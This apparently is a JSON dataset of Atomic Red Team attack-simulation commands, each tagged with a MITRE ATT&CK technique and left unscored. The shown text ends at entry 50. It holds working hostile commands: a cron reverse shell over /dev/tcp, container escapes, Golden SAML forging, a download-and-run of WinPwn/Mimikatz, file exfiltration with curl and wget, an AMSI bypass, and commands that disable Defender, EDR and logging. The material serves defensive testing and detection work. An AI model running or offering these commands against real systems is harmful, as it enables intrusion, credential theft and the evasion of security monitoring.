[
    {
        "ID": 1,
        "Command": "Import-Module \"PathToAtomicsFolder/T1595.003/src/WebServerScan.ps1\"\nInvoke-WordlistScan -Target \"http://localhost\" -Wordlist \"PathToAtomicsFolder/T1595.003/src/wordlist.txt\" -Timeout \"5\" -OutputFile \"$env:TMPDIR/wordlist_scan.txt\"\nWrite-Host \"Scan complete. Results saved to: $env:TMPDIR/wordlist_scan.txt\"\n",
        "Description": "This test will scan a target system with a wordlist of common directories and file paths.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1595.003",
        "Shell": "powershell"
    },
    {
        "ID": 2,
        "Command": "1. Create the required plist file\n\n\\tsudo touch /private/var/root/Library/Preferences/com.apple.loginwindow.plist\n\n2. Populate the plist with the location of your shell script\n\n\\tsudo defaults write com.apple.loginwindow LoginHook /Library/Scripts/AtomicRedTeam.sh\n\n3. Create the required plist file in the target user's Preferences directory\n\n\\t  touch /Users/$USER/Library/Preferences/com.apple.loginwindow.plist\n\n4. Populate the plist with the location of your shell script\n\n\\t  defaults write com.apple.loginwindow LoginHook /Library/Scripts/AtomicRedTeam.sh\n",
        "Description": "Mac logon script\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1037.002",
        "Shell": "manual"
    },
    {
        "ID": 3,
        "Command": "PathToAtomicsFolder\\T1055.011\\bin\\T1055.011_#{arch}.exe",
        "Description": "Hooks functions of main process to inject a payload via Extra Window Memory (EWM) injection technique",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1055.011",
        "Shell": "powershell"
    },
    {
        "ID": 4,
        "Command": "bcdedit /set testsigning on",
        "Description": "Allows adversaries to subvert trust controls by modifying the code signing policy, enabling the execution of unsigned drivers.",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1553.006",
        "Shell": "command_prompt"
    },
    {
        "ID": 5,
        "Command": "mv ~\\AppData\\Local\\Packages\\Microsoft.WindowsTerminal_8wekyb3d8bbwe\\LocalState\\settings.json ~\\AppData\\Local\\Temp\\settings.json\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1547.015/src/settings.json?raw=true\" -OutFile \"~\\AppData\\Local\\Packages\\Microsoft.WindowsTerminal_8wekyb3d8bbwe\\LocalState\\settings.json\"\nwt.exe\n",
        "Description": "Modify Windows Terminal settings.json file to gain persistence. [Twitter Post](https://twitter.com/nas_bench/status/1550836225652686848)",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1547.015",
        "Shell": "powershell"
    },
    {
        "ID": 6,
        "Command": "osascript PathToAtomicsFolder/T1547.015/src/add_login_item.osa\n",
        "Description": "Runs osascript on a file to create new LoginItem for current user.\nNOTE: Will popup dialog prompting user to Allow or Deny Terminal.app to control \"System Events\"\nTherefore, it can't be automated until the TCC is granted.\nThe login item launches Safari.app when user logs in, but there is a cleanup script to remove it as well.\nIn addition to the `osascript` Process Events, file modification events to\n`/Users/*/Library/Application Support/com.apple.backgroundtaskmanagementagent/backgrounditems.btm` should be seen.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1547.015",
        "Shell": "bash"
    },
    {
        "ID": 7,
        "Command": "kubectl --context kind-atomic-cluster run atomic-nsenter-escape-pod --restart=Never -ti --rm --image alpine --overrides '{\"spec\":{\"hostPID\": true, \"containers\":[{\"name\":\"1\",\"image\":\"alpine\",\"command\":[\"nsenter\",\"--mount=/proc/1/ns/mnt\",\"--\",\"/bin/bash\"],\"stdin\": true,\"tty\":true,\"securityContext\":{\"privileged\":true}}]}}'\n",
        "Description": "In this escape `kubectl` is used to launch a new pod, with a container that has the host pids mapped into the container (`hostPID:true`). It uses the alpine linux container image. It runs with privilege on the host (`privileged:true`). When the container is launched the command `nsenter --mount=/proc/1/ns/mnt -- /bin/bash` is ran. Since the host processes have been mapped into the container, the container enters the host namespace, escaping the container.\n\nAdditional Details:\n- https://twitter.com/mauilion/status/1129468485480751104\n- https://securekubernetes.com/scenario_2_attack/\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1611",
        "Shell": "sh"
    },
    {
        "ID": 8,
        "Command": "if [ ! -d /mnt/T1611.002 ]; then mkdir /mnt/T1611.002 ; mount /dev/dm-0 /mnt/T1611.002; fi\necho -n \"* * * * * root /bin/bash -c '/bin/bash -c echo \\\"\\\"; echo \\\"hello from host! \" > /mnt/T1611.002/etc/cron.d/T1611_002\necho -n \"$\" >> /mnt/T1611.002/etc/cron.d/T1611_002\necho -n \"(hostname) \" >> /mnt/T1611.002/etc/cron.d/T1611_002\necho -n \"$\" >> /mnt/T1611.002/etc/cron.d/T1611_002\necho \"(id)\\\" >& /dev/tcp/`ifconfig eth0 | grep inet | awk '{print $2}'`/4444 0>&1'\" >> /mnt/T1611.002/etc/cron.d/T1611_002\nnetcat -l -p 4444 2>&1\n",
        "Description": "This technique abuses privileged Docker containers to mount the host's filesystem and then create a cron job to launch a reverse shell as the host's superuser.\nThe container running the test needs be privileged.  It may take up to a minute for this to run due to how often crond triggers a job.\nDev note: the echo to create cron_filename is broken up to prevent localized execution of hostname and id by Powershell. \n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1611",
        "Shell": "sh"
    },
    {
        "ID": 9,
        "Command": "echo \"Current user: docker_user\"\nsudo -u docker_user sh -c \"sudo docker run -v /:/mnt --rm --name t1611_privesc -it alpine chroot /mnt id\"\n",
        "Description": "This test demonstrates privilege escalation by abusing Docker's volume mapping\nfeature to gain access to the host file system. By mounting the root directory\nof the host into a Docker container, the attacker can use chroot to operate as\nroot on the host system.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1611",
        "Shell": "sh"
    },
    {
        "ID": 10,
        "Command": "\"C:\\Program Files\\Oracle\\VirtualBox\\VBoxSVC.exe\" /reregserver\nregsvr32 /S \"C:\\Program Files\\Oracle\\VirtualBox\\VboxC.dll\"\nrundll32 \"C:\\Program Files\\Oracle\\VirtualBox\\VBoxRT.dll,RTR3Init\"\nsc create VBoxDRV binpath= \"C:\\Program Files\\Oracle\\VirtualBox\\drivers\\VboxDrv.sys\" type= kernel start= auto error= normal displayname= PortableVBoxDRV\nsc start VBoxDRV\n",
        "Description": "ransomware payloads via virtual machines (VM). \n[Maze ransomware](https://threatpost.com/maze-ransomware-ragnar-locker-virtual-machine/159350/)\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1564.006",
        "Shell": "command_prompt"
    },
    {
        "ID": 11,
        "Command": "\"C:\\Program Files\\Oracle\\VirtualBox\\VBoxManage.exe\" createvm --name \"Atomic VM\" --register\n\"C:\\Program Files\\Oracle\\VirtualBox\\VBoxManage.exe\" modifyvm \"Atomic VM\" --firmware efi\n\"C:\\Program Files\\Oracle\\VirtualBox\\VBoxManage.exe\" startvm \"Atomic VM\"\n",
        "Description": "Create a simple VirtualBox VM and start up the machine\nCleanup command stops and deletes the newly created VM and associated files\nhttps://www.virtualbox.org/manual/ch08.html#vboxmanage-startvm\nhttps://news.sophos.com/en-us/2020/05/21/ragnar-locker-ransomware-deploys-virtual-machine-to-dodge-security/\nhttps://attack.mitre.org/techniques/T1564/006/\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1564.006",
        "Shell": "command_prompt"
    },
    {
        "ID": 12,
        "Command": "$VM = \"Atomic VM\"\nNew-VM -Name $VM -Generation 2\nSet-VMFirmware $VM -EnableSecureBoot Off\nStart-VM $VM",
        "Description": "Create a simple Hyper-V VM (Windows native hypervisor) and start up the machine\nCleanup command stops and deletes the newly created VM\nhttps://docs.microsoft.com/en-us/virtualization/hyper-v-on-windows/quick-start/enable-hyper-v\nhttps://embracethered.com/blog/posts/2020/shadowbunny-virtual-machine-red-teaming-technique/\nhttps://attack.mitre.org/techniques/T1564/006/\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1564.006",
        "Shell": "powershell"
    },
    {
        "ID": 13,
        "Command": "C:\\Windows\\System32\\Curl.exe -k -F \"file=@PathToAtomicsFolder/T1048.002/src/artifact\" https://file.io/\n",
        "Description": "Exfiltrate data HTTPS using curl to file share site file.io\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1048.002",
        "Shell": "command_prompt"
    },
    {
        "ID": 14,
        "Command": "curl -F 'file=@PathToAtomicsFolder/T1048.002/src/artifact' -F 'maxDownloads=1' -F 'autoDelete=true' https://file.io/\n",
        "Description": "Exfiltrate data HTTPS using curl to file share site file.io\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1048.002",
        "Shell": "bash"
    },
    {
        "ID": 15,
        "Command": "wget --post-file=\"PathToAtomicsFolder/T1048.002/src/artifact\" --timeout=5 --no-check-certificate https://example.com/ --delete-after\n",
        "Description": "Exfiltrate data over HTTPS using wget --post-file method\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1048.002",
        "Shell": "sh"
    },
    {
        "ID": 16,
        "Command": "wget --post-data=\"msg=AtomicTestT1048.002\" --timeout=5 --no-check-certificate https://example.com/ --delete-after\n",
        "Description": "Exfiltrate data over HTTPS using wget --post-data method\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1048.002",
        "Shell": "sh"
    },
    {
        "ID": 17,
        "Command": "cd /tmp/T1030; split -b 5000000 T1030_urandom\nls -l /tmp/T1030\n",
        "Description": "Take a file/directory, split it into 5Mb chunks\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1030",
        "Shell": "sh"
    },
    {
        "ID": 18,
        "Command": "$file = [System.IO.File]::OpenRead([User specified])\n$chunkSize = 1024 * 1KB\n$buffer = New-Object Byte[] $chunkSize\n\nwhile ($bytesRead = $file.Read($buffer, 0, $buffer.Length)) {\n\\t$encodedChunk = [Convert]::ToBase64String($buffer, 0, $bytesRead)\n\\tInvoke-WebRequest -Uri http://example.com -Method Post -Body $encodedChunk\n}\n$file.Close()\n",
        "Description": "Simulate transferring data over a network in small chunks to evade detection.",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1030",
        "Shell": "powershell"
    },
    {
        "ID": 19,
        "Command": "Import-Module AADInternals -Force\n$saml = New-AADIntSAMLToken -ImmutableID \"aehgdqBTZV50DKQZmNJ8mg==\" -PfxFileName \".\\ADFS_signing.pfx\" -Issuer \"http://contoso.com/adfs/services/trust/\"\n$conn = Get-AADIntAccessTokenForAADGraph -SAMLToken $saml -SaveToCache\nif ($conn) { Write-Host \"`nSuccessfully connected as $($conn.User)\" } else { Write-Host \"`nThe connection failed\" }\nWrite-Host \"End of Golden SAML\"\n",
        "Description": "Forge a \"Golden SAML\" token which allows to impersonate any Azure AD user, and authenticate to AADGraph (as a proof). \nYou will need the ADFS token signing certificate (see T1552.004 to export it).\nMore info here : https://o365blog.com/post/adfs/\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1606.002",
        "Shell": "powershell"
    },
    {
        "ID": 20,
        "Command": "sudo insmod /tmp/T1547.006/T1547006.ko\n",
        "Description": "This test uses the insmod command to load a kernel module for Linux.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1547.006",
        "Shell": "bash"
    },
    {
        "ID": 21,
        "Command": "set -x\nsudo kextload /Library/Extensions/SoftRAID.kext\nkextstat 2>/dev/null | grep SoftRAID\nsudo kextunload /Library/Extensions/SoftRAID.kext\nsudo kmutil load -p /Library/Extensions/SoftRAID.kext\nkextstat 2>/dev/null | grep SoftRAID\nsudo kmutil unload -p /Library/Extensions/SoftRAID.kext\n",
        "Description": "This test uses the kextload and kmutil commands to load and unload a MacOS kernel module.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1547.006",
        "Shell": "bash"
    },
    {
        "ID": 22,
        "Command": "sudo /tmp/T1547006_iokit_loader\nkextstat 2>/dev/null | grep SoftRAID\nsudo kextunload /Library/Extensions/SoftRAID.kext\n",
        "Description": "This test uses the IOKit API to load a kernel module for macOS.\nHarcoded to use SoftRAID kext\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1547.006",
        "Shell": "bash"
    },
    {
        "ID": 23,
        "Command": "$examplePath = Join-Path $env:windir \"system32\\Com\"; if (-not (Test-Path $examplePath)) { New-Item -ItemType Directory -Path $examplePath | Out-Null }; $exampleName = \"comadmin.dat\"; $exampleFullPath = Join-Path $examplePath $exampleName; $randomBytes = New-Object Byte[] 0x1000; (New-Object Random).NextBytes($randomBytes); [System.IO.File]::WriteAllBytes($exampleFullPath, $randomBytes)\n",
        "Description": "The following Atomic Test will write an file, comadmin.dat, to disk. From the report, Snake's installer drops the kernel driver and a custom DLL which is used to load the driver into a\nsingle AES encrypted file on disk. Typically, this file is named “comadmin.dat” and is stored in the %windows%\\system32\\Com directory. \nThis Atomic Test will write a hardcoded named file to disk in the com directory named comadmin.dat.\n[Snake Malware - CISA](https://media.defense.gov/2023/May/09/2003218554/-1/-1/0/JOINT_CSA_HUNTING_RU_INTEL_SNAKE_MALWARE_20230509.PDF)  \n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1547.006",
        "Shell": "powershell"
    },
    {
        "ID": 24,
        "Command": "# Registry setting to \"Trust access to the VBA project object model\" in Word\n$registryKey = \"HKCU:Software\\Microsoft\\Office\\16.0\\Word\\Security\"\n$registryValue = \"AccessVBOM\"\n$registryData = \"1\"\n# The path where a flag text file will be created if Registry setting did not already exist or if it was set to 0\n$flagPath1 = \"$env:USERPROFILE\\AppData\\Roaming\\Microsoft\\Templates\\T1137-001_Flag1.txt\"\n$flagPath2 = \"$env:USERPROFILE\\AppData\\Roaming\\Microsoft\\Templates\\T1137-001_Flag2.txt\"\n# Get the value of the Key/Value pair\n$value = (Get-ItemProperty -Path $registryKey -Name $registryValue -ErrorAction SilentlyContinue).$registryValue\n# Logical operation to: if the value of the key/value is 1, do nothing - \n# if the value is 0, change it to 1 and create flag1 - \n# if it doesn't exist, create the value and flag2\nif ($value -eq \"1\") \n{\n  Write-Host \"The registry value '$registryValue' already exists with the required setting.\"\n}   \n  elseif ($value -eq \"0\") \n{\n  Write-Host \"The registry value was set to 0, temporarily changing to 1.\"\n  New-ItemProperty -Path $registryKey -Name $registryValue -Value $registryData -PropertyType DWORD -Force | Out-Null\n  echo \"flag1\" > $flagPath1\n} \n  else \n{\n  Write-Host \"The registry value '$registryValue' does not exist, temporarily creating it.\"\n  New-ItemProperty -Path $registryKey -Name $registryValue -Value $registryData -PropertyType DWORD -Force | Out-Null\n  echo \"flag2\" > $flagPath2\n}\nAdd-Type -AssemblyName Microsoft.Office.Interop.Word\n# Define the path of copied normal template for restoral\n$copyPath = \"$env:USERPROFILE\\AppData\\Roaming\\Microsoft\\Templates\\Normal1.dotm\"\n# Define the path to the normal template\n$docPath = \"$env:USERPROFILE\\AppData\\Roaming\\Microsoft\\Templates\\Normal.dotm\"\n# Create copy of orginal template for restoral\nCopy-Item -Path $docPath -Destination $copyPath -Force\n# VBA code to be insterted as a Macro\n# Will create a scheduled task to open the Calculator at 8:04pm daily\n$vbaCode = @\"\n  Sub AutoExec()\n  Dim applicationPath As String\n  Dim taskName As String\n  Dim runTime As String\n  Dim schTasksCmd As String\n  applicationPath = \"C:\\Windows\\System32\\calc.exe\"\n  taskName = \"OpenCalcTask\"\n  runTime = \"20:04\"\n  schTasksCmd = \"schtasks /create /tn \"\"\" & taskName & \"\"\" /tr \"\"\" & applicationPath & \"\"\" /sc daily /st \" & runTime & \" /f\"\n  Shell \"cmd.exe /c \" & schTasksCmd, vbNormalFocus\n  End Sub\n\"@\n# Create a new instance of Word.Application\n$word = New-Object -ComObject Word.Application\n# Keep the Word application hidden\n$word.Visible = $false\n# Open the document\n$document = $word.Documents.Open($docPath)\n# Access the VBA project of the document\n$vbaProject = $document.VBProject\n# Add a new module to the VBA project\n$newModule = $vbaProject.VBComponents.Add(1) # 1 = vbext_ct_StdModule\n# Add the VBA code to the new module\n$newModule.CodeModule.AddFromString($vbaCode)\n# Run the Macro\n$word.run(\"AutoExec\")\n# Save and close the document\n$document.SaveAs($docPath)\n$document.Close()\n# Quit Word\n$word.Quit()\n# Release COM objects\n[System.Runtime.InteropServices.Marshal]::ReleaseComObject($document) | Out-Null\n[System.Runtime.InteropServices.Marshal]::ReleaseComObject($word) | Out-Null\n[System.Runtime.InteropServices.Marshal]::ReleaseComObject($vbaProject) | Out-Null\n[System.Runtime.InteropServices.Marshal]::ReleaseComObject($newModule) | Out-Null\n",
        "Description": "Injects a Macro in the Word default template \"Normal.dotm\" and makes it execute each time that Word is opened. In this test, the Macro creates a sheduled task to open Calc.exe every evening.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1137.001",
        "Shell": "powershell"
    },
    {
        "ID": 25,
        "Command": ". \"$PathToAtomicsFolder\\T1134.004\\src\\PPID-Spoof.ps1\"\n$ppid=Get-Process explorer | select -expand id\nPPID-Spoof -ppid $ppid -spawnto \"C:\\Program Files\\Internet Explorer\\iexplore.exe\" -dllpath \"PathToAtomicsFolder\\T1134.004\\bin\\calc.dll\"\n",
        "Description": "This test uses PowerShell to replicates how Cobalt Strike does ppid spoofing and masquerade a spawned process.\nUpon execution, \"Process C:\\Program Files\\Internet Explorer\\iexplore.exe is spawned with pid ####\" will be displayed and\ncalc.exe will be launched.\n\nCredit to In Ming Loh (https://github.com/countercept/ppid-spoofing/blob/master/PPID-Spoof.ps1)\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1134.004",
        "Shell": "powershell"
    },
    {
        "ID": 26,
        "Command": "Start-ATHProcessUnderSpecificParent -FilePath $Env:windir\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -CommandLine '-Command Start-Sleep 10' -ParentId $PID",
        "Description": "Spawns a powershell.exe process as a child of the current process.",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1134.004",
        "Shell": "powershell"
    },
    {
        "ID": 27,
        "Command": "Start-ATHProcessUnderSpecificParent  -ParentId $PID -TestGuid 12345678-1234-1234-1234-123456789123",
        "Description": "Spawns a notepad.exe process as a child of the current process.",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1134.004",
        "Shell": "powershell"
    },
    {
        "ID": 28,
        "Command": "Get-CimInstance -ClassName Win32_Process -Property Name, CommandLine, ProcessId -Filter \"Name = 'svchost.exe' AND CommandLine LIKE '%'\" | Select-Object -First 1 | Start-ATHProcessUnderSpecificParent -FilePath $Env:windir\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -CommandLine '-Command Start-Sleep 10'",
        "Description": "Spawnd a process as a child of the first accessible svchost.exe process.",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1134.004",
        "Shell": "powershell"
    },
    {
        "ID": 29,
        "Command": "Start-Process -FilePath $Env:windir\\System32\\notepad.exe -PassThru | Start-ATHProcessUnderSpecificParent -FilePath $Env:windir\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -CommandLine '-Command Start-Sleep 10'",
        "Description": "Creates a notepad.exe process and then spawns a powershell.exe process as a child of it.",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1134.004",
        "Shell": "powershell"
    },
    {
        "ID": 30,
        "Command": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nmimiload -consoleoutput -noninteractive",
        "Description": "Reflectively load Mimik@tz into memory technique via function of WinPwn",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1620",
        "Shell": "powershell"
    },
    {
        "ID": 31,
        "Command": "copy \"C:\\Windows\\System32\\calc.exe\" %temp%\\T1036.007_masquerading.docx.exe /Y\ncopy \"C:\\Windows\\System32\\calc.exe\" %temp%\\T1036.007_masquerading.pdf.exe /Y\ncopy \"C:\\Windows\\System32\\calc.exe\" %temp%\\T1036.007_masquerading.ps1.exe /Y\ncopy \"PathToAtomicsFolder\\T1036.007\\src\\T1036.007_masquerading.vbs\" %temp%\\T1036.007_masquerading.xls.vbs /Y\ncopy \"PathToAtomicsFolder\\T1036.007\\src\\T1036.007_masquerading.vbs\" %temp%\\T1036.007_masquerading.xlsx.vbs /Y\ncopy \"PathToAtomicsFolder\\T1036.007\\src\\T1036.007_masquerading.vbs\" %temp%\\T1036.007_masquerading.png.vbs /Y\ncopy \"PathToAtomicsFolder\\T1036.007\\src\\T1036.007_masquerading.ps1\" %temp%\\T1036.007_masquerading.doc.ps1 /Y\ncopy \"PathToAtomicsFolder\\T1036.007\\src\\T1036.007_masquerading.ps1\" %temp%\\T1036.007_masquerading.pdf.ps1 /Y\ncopy \"PathToAtomicsFolder\\T1036.007\\src\\T1036.007_masquerading.ps1\" %temp%\\T1036.007_masquerading.rtf.ps1 /Y\n%temp%\\T1036.007_masquerading.docx.exe\n%temp%\\T1036.007_masquerading.pdf.exe\n%temp%\\T1036.007_masquerading.ps1.exe\n%temp%\\T1036.007_masquerading.xls.vbs\n%temp%\\T1036.007_masquerading.xlsx.vbs\n%temp%\\T1036.007_masquerading.png.vbs\nC:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -File %temp%\\T1036.007_masquerading.doc.ps1\nC:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -File %temp%\\T1036.007_masquerading.pdf.ps1\nC:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -File %temp%\\T1036.007_masquerading.rtf.ps1\n",
        "Description": "download and execute a file masquerading as images or Office files. Upon execution 3 calc instances and 3 vbs windows will be launched.\n\ne.g SOME_LEGIT_NAME.[doc,docx,xls,xlsx,pdf,rtf,png,jpg,etc.].[exe,vbs,js,ps1,etc] (Quartelyreport.docx.exe)\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1036.007",
        "Shell": "command_prompt"
    },
    {
        "ID": 32,
        "Command": "systemctl stop rsyslog ; systemctl disable rsyslog\n",
        "Description": "Disables syslog collection\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1562.001",
        "Shell": "sh"
    },
    {
        "ID": 33,
        "Command": "service syslogd stop\nsysrc syslogd_enable=\"NO\"\n",
        "Description": "Disables syslog collection\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1562.001",
        "Shell": "sh"
    },
    {
        "ID": 34,
        "Command": "if [ $(rpm -q --queryformat '%{VERSION}' centos-release) -eq \"6\" ];\nthen\n  service cbdaemon stop\n  chkconfig off cbdaemon\nelse if [ $(rpm -q --queryformat '%{VERSION}' centos-release) -eq \"7\" ];\n  systemctl stop cbdaemon\n  systemctl disable cbdaemon\nfi\n",
        "Description": "Disable the Cb Response service\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1562.001",
        "Shell": "sh"
    },
    {
        "ID": 35,
        "Command": "setenforce 0\n",
        "Description": "Disables SELinux enforcement\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1562.001",
        "Shell": "sh"
    },
    {
        "ID": 36,
        "Command": "sudo systemctl stop falcon-sensor.service\nsudo systemctl disable falcon-sensor.service\n",
        "Description": "Stop and disable Crowdstrike Falcon on Linux\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1562.001",
        "Shell": "sh"
    },
    {
        "ID": 37,
        "Command": "sudo launchctl unload /Library/LaunchDaemons/com.carbonblack.daemon.plist\nsudo launchctl unload /Library/LaunchDaemons/com.carbonblack.defense.daemon.plist\n",
        "Description": "Disables Carbon Black Response\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1562.001",
        "Shell": "sh"
    },
    {
        "ID": 38,
        "Command": "sudo launchctl unload /Library/LaunchDaemons/at.obdev.littlesnitchd.plist\n",
        "Description": "Disables LittleSnitch\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1562.001",
        "Shell": "sh"
    },
    {
        "ID": 39,
        "Command": "sudo launchctl unload /Library/LaunchDaemons/com.opendns.osx.RoamingClientConfigUpdater.plist\n",
        "Description": "Disables OpenDNS Umbrella\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1562.001",
        "Shell": "sh"
    },
    {
        "ID": 40,
        "Command": "sudo spctl --master-disable\n",
        "Description": "Disables macOS Gatekeeper\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1562.001",
        "Shell": "sh"
    },
    {
        "ID": 41,
        "Command": "sudo launchctl unload /Library/LaunchDaemons/com.crowdstrike.falcond.plist\nsudo launchctl unload /Library/LaunchDaemons/com.crowdstrike.userdaemon.plist\n",
        "Description": "Stop and unload Crowdstrike Falcon daemons falcond and userdaemon on macOS\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1562.001",
        "Shell": "sh"
    },
    {
        "ID": 42,
        "Command": "fltmc.exe unload SysmonDrv\n",
        "Description": "Unloads the Sysinternals Sysmon filter driver without stopping the Sysmon service. To verify successful execution,\nrun the prereq_command's and it should fail with an error of \"sysmon filter must be loaded\".\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1562.001",
        "Shell": "command_prompt"
    },
    {
        "ID": 43,
        "Command": "sysmon -u\n",
        "Description": "Uninstall Sysinternals Sysmon for Defense Evasion\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1562.001",
        "Shell": "command_prompt"
    },
    {
        "ID": 44,
        "Command": "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)\n",
        "Description": "Any easy way to bypass AMSI inspection is it patch the dll in memory setting the \"amsiInitFailed\" function to true.\nUpon execution, no output is displayed.\n\nhttps://www.mdsec.co.uk/2018/06/exploring-powershell-amsi-and-logging-evasion/\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1562.001",
        "Shell": "powershell"
    },
    {
        "ID": 45,
        "Command": "Remove-Item -Path \"HKLM:\\SOFTWARE\\Microsoft\\AMSI\\Providers\\{2781761E-28E0-4109-99FE-B9D127C57AFE}\" -Recurse\n",
        "Description": "With administrative rights, an adversary can remove the AMSI Provider registry key in HKLM\\Software\\Microsoft\\AMSI to disable AMSI inspection.\nThis test removes the Windows Defender provider registry key. Upon execution, no output is displayed.\nOpen Registry Editor and navigate to \"HKLM:\\SOFTWARE\\Microsoft\\AMSI\\Providers\\\" to verify that it is gone.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1562.001",
        "Shell": "powershell"
    },
    {
        "ID": 46,
        "Command": "net.exe stop McAfeeDLPAgentService\nsc.exe config McAfeeDLPAgentService start= disabled\n",
        "Description": "With administrative rights, an adversary can disable Windows Services related to security products. This test requires McAfeeDLPAgentService to be installed.\nChange the service_name input argument for your AV solution. Upon exeuction, infomration will be displayed stating the status of the service.\nTo verify that the service has stopped, run \"sc query McAfeeDLPAgentService\"\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1562.001",
        "Shell": "command_prompt"
    },
    {
        "ID": 47,
        "Command": "Set-MpPreference -DisableRealtimeMonitoring 1\nSet-MpPreference -DisableBehaviorMonitoring 1\nSet-MpPreference -DisableScriptScanning 1\nSet-MpPreference -DisableBlockAtFirstSeen 1\n",
        "Description": "Attempting to disable scheduled scanning and other parts of windows defender atp. Upon execution Virus and Threat Protection will show as disabled\nin Windows settings.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1562.001",
        "Shell": "powershell"
    },
    {
        "ID": 48,
        "Command": "sc stop WinDefend\nsc config WinDefend start=disabled\nsc query WinDefend\n",
        "Description": "Attempting to disable scheduled scanning and other parts of windows defender atp. These commands must be run as System, so they still fail as administrator.\nHowever, adversaries do attempt to perform this action so monitoring for these command lines can help alert to other bad things going on. Upon execution, \"Access Denied\"\nwill be displayed twice and the WinDefend service status will be displayed.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1562.001",
        "Shell": "command_prompt"
    },
    {
        "ID": 49,
        "Command": "Set-ItemProperty \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\" -Name DisableAntiSpyware -Value 1\n",
        "Description": "Disable Windows Defender from starting after a reboot. Upen execution, if the computer is rebooted the entire Virus and Threat protection window in Settings will be\ngrayed out and have no info.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1562.001",
        "Shell": "powershell"
    },
    {
        "ID": 50,
